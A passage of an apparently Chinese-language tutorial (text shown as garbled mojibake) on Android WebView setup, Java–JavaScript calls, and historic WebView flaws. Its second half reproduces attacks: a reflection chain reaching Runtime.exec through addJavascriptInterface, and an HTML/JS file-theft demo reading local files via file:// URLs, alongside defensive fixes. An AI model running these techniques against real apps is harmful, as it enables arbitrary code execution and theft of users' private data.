<span class="variable">webview</span> <span class="operator">=</span> (WebView) findViewById(R.id.webView1);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥ï¼šè¿›è¡Œé…ç½®-åˆ©ç”¨WebSettingså­ç±»ï¼ˆå¸¸è§æ–¹æ³•ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å£°æ˜WebSettingså­ç±»</span></span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> webView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å¦‚æœè®¿é—®çš„é¡µé¢ä¸­è¦ä¸Javascriptäº¤äº’ï¼Œåˆ™webviewå¿…é¡»è®¾ç½®æ”¯æŒJavascript</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ”¯æŒæ’ä»¶</span></span><br><span class="line">webSettings.setPluginsEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å…³é—­webviewä¸­ç¼“å­˜</span></span><br><span class="line">webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); </span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®å¯ä»¥è®¿é—®æ–‡ä»¶</span></span><br><span class="line">webSettings.setAllowFileAccess(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>å¸¸è§æ–¹æ³•ï¼šè®¾ç½®WebViewç¼“å­˜</p><ul><li>å½“åŠ è½½ html é¡µé¢æ—¶ï¼ŒWebViewä¼šåœ¨/data/data/åŒ…åç›®å½•ä¸‹ç”Ÿæˆ database ä¸ cache ä¸¤ä¸ªæ–‡ä»¶å¤¹</li><li>è¯·æ±‚çš„ URLè®°å½•ä¿å­˜åœ¨ WebViewCache.dbï¼Œè€Œ URLçš„å†…å®¹æ˜¯ä¿å­˜åœ¨ WebViewCache æ–‡ä»¶å¤¹ä¸‹</li></ul><h5 id="WebViewClientç±»"><strong>WebViewClientç±»</strong></h5><p>ä½œç”¨ï¼šç”¨æ¥å¤„ç†å„ç§é€šçŸ¥ &amp; è¯·æ±‚äº‹ä»¶</p><p><strong>shouldOverrideUrlLoading()</strong></p><p>ä½œç”¨ï¼šæ‰“å¼€ç½‘é¡µæ—¶ä¸è°ƒç”¨ç³»ç»Ÿæµè§ˆå™¨ï¼Œ è€Œæ˜¯åœ¨æœ¬WebViewä¸­æ˜¾ç¤ºï¼›åœ¨ç½‘é¡µä¸Šçš„æ‰€æœ‰åŠ è½½éƒ½ç»è¿‡è¿™ä¸ªæ–¹æ³•,è¿™ä¸ªå‡½æ•°æˆ‘ä»¬å¯ä»¥åšå¾ˆå¤šæ“ä½œã€‚</p><h4 id="webviewä¸jsåŠ æŠ¤">webviewä¸jsåŠ æŠ¤</h4><p><img src="/posts/f416437f.htm/905443_F97H8PAK73A38RC.png" alt="image-20220726171737615"></p><h5 id="Androidè°ƒç”¨JS">Androidè°ƒç”¨JS</h5><p>å‡†å¤‡jsæ–‡ä»¶ï¼Œæ”¾åˆ°assetsä¸­</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>æµ‹è¯•<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;Androidè°ƒç”¨äº†JSçš„callJSæ–¹æ³•&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Androidè°ƒç”¨JSæ–¹æ³•æµ‹è¯•<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨Javaå±‚ä¸­æ·»åŠ ä»£ç ï¼Œè¿›è¡Œè°ƒç”¨JSæ–‡ä»¶ä»¥åŠJSä¸­çš„æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®ä¸Jsäº¤äº’çš„æƒé™</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// è®¾ç½®å…è®¸JSå¼¹çª—</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// å…ˆè½½å…¥JSä»£ç </span></span><br><span class="line"> <span class="comment">// æ ¼å¼è§„å®šä¸º:file:///android_asset/æ–‡ä»¶å.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// é€šè¿‡Handlerå‘é€æ¶ˆæ¯</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// æ³¨æ„è°ƒç”¨çš„JSæ–¹æ³•åè¦å¯¹åº”ä¸Š</span></span><br><span class="line">                 <span class="comment">// è°ƒç”¨javascriptçš„callJS()æ–¹æ³•</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// ç”±äºè®¾ç½®äº†å¼¹çª—æ£€éªŒè°ƒç”¨ç»“æœ,æ‰€ä»¥éœ€è¦æ”¯æŒjså¯¹è¯æ¡†</span></span><br><span class="line"> <span class="comment">// webviewåªæ˜¯è½½ä½“ï¼Œå†…å®¹çš„æ¸²æŸ“éœ€è¦ä½¿ç”¨webviewChromClientç±»å»å®ç°</span></span><br><span class="line"> <span class="comment">// é€šè¿‡è®¾ç½®WebChromeClientå¯¹è±¡å¤„ç†JavaScriptçš„å¯¹è¯æ¡†</span></span><br><span class="line"> <span class="comment">//è®¾ç½®å“åº”js çš„Alert()å‡½æ•°</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p><strong>ç‰¹åˆ«æ³¨æ„ï¼šJSä»£ç è°ƒç”¨ä¸€å®šè¦åœ¨ <code>onPageFinishedï¼ˆï¼‰</code> å›è°ƒä¹‹åæ‰èƒ½è°ƒç”¨ï¼Œå¦åˆ™ä¸ä¼šè°ƒç”¨</strong></p><p>onPageFinished()å±äºWebViewClientç±»çš„æ–¹æ³•ï¼Œä¸»è¦åœ¨é¡µé¢åŠ è½½ç»“æŸæ—¶è°ƒç”¨</p><p>è¿˜å¯ä»¥ä½¿ç”¨**WebView.evaluateJavascript()**è°ƒç”¨jsä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨evaluateJavascriptæ¥åŠ è½½</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//æ­¤å¤„ä¸º js è¿”å›çš„ç»“æœ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Webviewæ¼æ´-2">Webviewæ¼æ´</h3><h4 id="æ¼æ´ç±»å‹æ¦‚æ‹¬">æ¼æ´ç±»å‹æ¦‚æ‹¬</h4><p><img src="https://bbs.kanxue.com/upload/attach/202207/905443_E25ZWREXH5JZHN2.png" alt="image-20220729145936266"></p><p><img src="/posts/f416437f.htm/905443_C8YTUCX4746WZHB-17271001469662.png" alt="image-20220729152654652"></p><h4 id="å†å²æ¼æ´">å†å²æ¼æ´</h4><h5 id="Webviewä»»æ„ä»£ç æ‰§è¡Œæ¼æ´">Webviewä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</h5><p><strong>addJavascriptInterfaceæ¥å£å¼•èµ·è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong></p><p><strong>æ¼æ´åŸç†</strong></p><p>JSå’ŒAndroidçš„ç›´æ¥é€šä¿¡å¯ä»¥é€šè¿‡addJavascriptInterfaceæ¥å£è¿›è¡Œå¯¹è±¡æ˜ å°„</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> JSObject(), <span class="string">&quot;myObj&quot;</span>);</span><br><span class="line"><span class="comment">// å‚æ•°1ï¼šAndroidçš„æœ¬åœ°å¯¹è±¡</span></span><br><span class="line"><span class="comment">// å‚æ•°2ï¼šJSçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment">// é€šè¿‡å¯¹è±¡æ˜ å°„å°†Androidä¸­çš„æœ¬åœ°å¯¹è±¡å’ŒJSä¸­çš„å¯¹è±¡è¿›è¡Œå…³è”ï¼Œä»è€Œå®ç°JSè°ƒç”¨Androidçš„å¯¹è±¡å’Œæ–¹æ³•</span></span><br></pre></td></tr></table></figure><p>å½“JSæ‹¿åˆ°Androidè¿™ä¸ªå¯¹è±¡åï¼Œå°±å¯ä»¥è°ƒç”¨è¿™ä¸ªAndroidå¯¹è±¡ä¸­æ‰€æœ‰çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ç³»ç»Ÿç±»ï¼ˆjava.lang.Runtime ç±»ï¼‰ï¼Œä»è€Œè¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>å…·ä½“çš„æ”»å‡»æ­¥éª¤ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰Androidä¸­çš„å¯¹è±¡æœ‰ä¸€å…¬å…±çš„æ–¹æ³•ï¼šgetClass()</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰è¯¥æ–¹æ³•å¯ä»¥è·å–åˆ°å½“å‰ç±» ç±»å‹<span class="keyword">Class</span></span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰è¯¥ç±»æœ‰ä¸€å…³é”®çš„æ–¹æ³•ï¼š <span class="keyword">Class</span>.forNameï¼›</span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰è¯¥æ–¹æ³•å¯ä»¥åŠ è½½ä¸€ä¸ªç±»ï¼ˆå¯åŠ è½½ java.lang.<span class="keyword">Runtime</span> ç±»ï¼‰</span><br><span class="line">ï¼ˆ<span class="number">5</span>ï¼‰è€Œè¯¥ç±»æ˜¯å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤çš„</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// æ­¥éª¤1ï¼šéå† window å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// ç›®çš„æ˜¯ä¸ºäº†æ‰¾åˆ°åŒ…å« getClass ï¼ˆï¼‰çš„å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// å› ä¸ºAndroidæ˜ å°„çš„JSå¯¹è±¡ä¹Ÿåœ¨windowä¸­ï¼Œæ‰€ä»¥è‚¯å®šä¼šéå†åˆ°</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj in window) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123; </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ­¥éª¤2ï¼šåˆ©ç”¨åå°„è°ƒç”¨forNameï¼ˆï¼‰å¾—åˆ°Runtimeç±»å¯¹è±¡</span></span><br><span class="line">            alert(obj);         </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>) </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ­¥éª¤3ï¼šä»¥åï¼Œå°±å¯ä»¥è°ƒç”¨é™æ€æ–¹æ³•æ¥æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œæ¯”å¦‚è®¿é—®æ–‡ä»¶çš„å‘½ä»¤</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä»æ‰§è¡Œå‘½ä»¤åè¿”å›çš„è¾“å…¥æµä¸­å¾—åˆ°å­—ç¬¦ä¸²ï¼Œæœ‰å¾ˆä¸¥é‡æš´éœ²éšç§çš„å±é™©ã€‚</span></span><br><span class="line"><span class="comment">// å¦‚æ‰§è¡Œå®Œè®¿é—®æ–‡ä»¶çš„å‘½ä»¤ä¹‹åï¼Œå°±å¯ä»¥å¾—åˆ°æ–‡ä»¶åçš„ä¿¡æ¯äº†ã€‚</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´é˜²æŠ¤</strong></p><p>Googleåœ¨Android4.2ä»¥åå¯¹è°ƒç”¨çš„å‡½æ•°ä»¥<code>@JavascriptInterface</code>è¿›è¡Œæ³¨è§£ä»è€Œé¿å…æ¼æ´æ”»å‡»ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬jsè°ƒç”¨Androidçš„æ–¹æ³•ï¼Œå¿…é¡»è¦åœ¨JavascriptInterfaceä¸­è¿›è¡Œå£°æ˜ï¼Œè¿™æ ·æ‰èƒ½è°ƒç”¨ã€‚</p><h5 id="webviewæ˜æ–‡å­˜å‚¨æ¼æ´">webviewæ˜æ–‡å­˜å‚¨æ¼æ´</h5><p>WebViewé»˜è®¤å¼€å¯å¯†ç ä¿å­˜åŠŸèƒ½ ï¼š</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setSavePassword(<span class="literal">true</span>)`</span><br></pre></td></tr></table></figure><p>å¼€å¯åï¼Œåœ¨ç”¨æˆ·è¾“å…¥å¯†ç æ—¶ï¼Œä¼šå¼¹å‡ºæç¤ºæ¡†ï¼šè¯¢é—®ç”¨æˆ·æ˜¯å¦ä¿å­˜å¯†ç ï¼›</p><p>å¦‚æœé€‰æ‹©â€æ˜¯â€ï¼Œå¯†ç ä¼šè¢«æ˜æ–‡ä¿åˆ° <code>/data/data/com.package.name/databases/webview.db</code> ä¸­ï¼Œè¿™æ ·å°±æœ‰è¢«ç›—å–å¯†ç çš„å±é™©</p><p><strong>å®‰å…¨é˜²æŠ¤ï¼š</strong></p><p>é€šè¿‡ WebSettings.setSavePassword(false) å…³é—­å¯†ç ä¿å­˜æé†’åŠŸèƒ½ï¼Œé˜²æ­¢æ˜æ–‡å¯†ç å­˜åœ¨æœ¬åœ°è¢«ç›—ç”¨ã€‚</p><h4 id="è·¨åŸŸæ¼æ´"><strong>è·¨åŸŸæ¼æ´</strong></h4><p>WebViewå¼€å¯äº†fileåŸŸè®¿é—®ï¼Œä¸”å…è®¸fileåŸŸå¯¹httpåŸŸè¿›è¡Œè®¿é—®ï¼ŒåŒæ—¶æœªå¯¹fileåŸŸçš„è·¯å¾„è¿›è¡Œä¸¥æ ¼é™åˆ¶æ‰€è‡´ï¼Œæ”»å‡»è€…é€šè¿‡URL Schemeçš„æ–¹å¼ï¼Œå¯è¿œç¨‹æ‰“å¼€å¹¶åŠ è½½æ¶æ„HTMLæ–‡ä»¶ï¼Œè¿œç¨‹è·å–appä¸­åŒ…æ‹¬ç”¨æˆ·ç™»å½•å‡­è¯åœ¨å†…çš„æ‰€æœ‰æœ¬åœ°æ•æ„Ÿæ•°æ®ã€‚</p><p>é’ˆå¯¹è¿™ä¸ªæ¼æ´ï¼Œæ¶‰åŠå¦‚ä¸‹å‡ ä¸ªapiå‡½æ•°ï¼š</p><p><img src="/posts/f416437f.htm/image-20240930170405744.png" alt="image-20240930170405744"></p><h5 id="ä»»æ„æ–‡ä»¶çªƒå–-åº”ç”¨å…‹éš†æ¼æ´">ä»»æ„æ–‡ä»¶çªƒå–(åº”ç”¨å…‹éš†æ¼æ´)</h5><p><strong>æ¼æ´åŸç†</strong></p><p>setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</p><p>è¿™æ ·ä½¿å¾—WebViewå¯ä»¥ä½¿ç”¨Fileåè®®å’ŒåŠ è½½jsä»£ç è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œè¿™æ ·ä¼šå¯¼è‡´æ”»å‡»è€…æ“ä½œç”¨æˆ·ç‚¹å‡»åæ— æ„ŸçŸ¥ä¸‹è½½æ¶æ„çš„HTML/JSï¼Œå¹¶çªƒå–ç›¸å…³çš„ç§æœ‰æ–‡ä»¶ä¿¡æ¯ã€‚</p><p><strong>æ¼æ´å¤ç°</strong></p><p>æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢Androidæ‰‹æœºä¸­çš„<code>/etc/hosts</code>ç§æœ‰æ–‡ä»¶ä¿¡æ¯</p><p><img src="/posts/f416437f.htm/905443_D6RRGQX47ZWBV4B.png" alt="image-20220729195648955"></p><p>ç¼–å†™ä¸€ä¸ªjsæ–‡ä»¶æ¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼š<strong>fileAttack.html</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;file:///etc/hosts&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)  <span class="comment">//å½“XMLHttpRequestå‘ç”Ÿå˜åŒ–æ—¶ è§¦å‘å›è°ƒ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)          <span class="comment">//è¯·æ±‚æ˜¯å¦å®Œæˆ     </span></span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ è‡³æ‰‹æœº /data/local/tmpä¸‹</p><p>ç¼–å†™æ”»å‡»ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//è®¾ç½®æ˜¯å¦å…è®¸ WebView ä½¿ç”¨ File åè®®</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è®¾ç½®æ˜¯å¦å…è®¸ WebView ä½¿ç”¨ JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">   webView.getSettings().setAllowFileAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±è·å–äº†ç›¸åº”çš„ç§æœ‰æ–‡ä»¶ä¿¡æ¯ï¼Œè€Œä¸”åŠ è½½äº†æˆ‘ä»¬çš„æ¶æ„htmlæ–‡ä»¶</p><h5 id="é€šç”¨åè®®æ¼æ´-æ¶æ„é¡µé¢æ³¨å…¥">é€šç”¨åè®®æ¼æ´(æ¶æ„é¡µé¢æ³¨å…¥)</h5><p>setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</p><p>ç”¨åŒæ ·çš„æ–¹å¼æµ‹è¯• setAllowUniversalAccessFromFileURLs çš„å€¼ï¼Œå½“ setAllowUniversalAccessFromFileURLs çš„å€¼ä¸º true æ—¶ï¼Œå¯ä»¥åˆ©ç”¨ js æ¥è®¿é—®æ¶æ„ç½‘ç«™ï¼ˆHTTP æˆ– HTTPSï¼‰çš„é“¾æ¥</p><p>æˆ‘ä»¬å°†ä¸Šé¢htmlä¸­çš„è®¿é—®æ”¹ä¸ºçœ‹é›ªçš„ç½‘ç«™ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span 